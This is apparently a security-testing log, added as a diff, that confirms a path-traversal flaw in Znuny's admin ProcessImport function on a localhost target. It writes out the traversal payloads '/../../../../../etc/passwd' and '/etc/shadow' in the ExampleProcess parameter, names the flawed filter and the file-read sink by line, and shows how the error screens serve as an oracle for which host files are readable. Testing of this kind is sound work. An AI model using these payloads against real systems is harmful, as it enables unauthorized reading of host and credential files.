@@ -1,0 +1,16 @@
+==========================================================================
+VULN-007: Broken ../ filter → admin arbitrary host file read
+Target: http://localhost:25114
+[INFO] hitting AdminProcessManagement;ProcessImport — ExampleProcess filter lacks /g (line 109)
+[INFO] sink: Main::FileRead($Home/var/processes/examples/$ExampleProcessFilename) (line 146)
+==========================================================================
+[SETUP] logging in as admin root@localhost (admin-group operator)
+[INFO] ChallengeToken = c35YlffbHxhcQWte5y4i5BCGiEma7Ke1
+[STEP] POST ProcessImport ExampleProcess=/../../../../../etc/passwd
+[PROOF] passwd   -> 'Error - Admin - Znuny'  => READABLE
+[STEP] POST ProcessImport ExampleProcess=/../../../../../etc/shadow
+[PROOF] shadow   -> 'Fatal Error - Frontend - Znuny'  => UNREADABLE
+[STEP] POST ProcessImport ExampleProcess=/../../../../../etc/zzz_adeada1a
+[PROOF] missing  -> 'Fatal Error - Frontend - Znuny'  => UNREADABLE
+[OK] exploit confirmed — traversal escapes var/processes/examples/: /etc/passwd is READ (readable screen) while /etc/shadow (perm-denied) and a nonexistent path both return 'Could not read' — an arbitrary host file-read reachability oracle as admin, crossing the app→host boundary.
+==> VULN-007: CONFIRMED — traversal escapes var/processes/examples/: /etc/passwd is READ (readable screen) while /etc/shadow (perm-denied) and a nonexistent path both return 'Could not read' — an arbitrary host file-read reachability oracle as admin, crossing the app→host boundary.
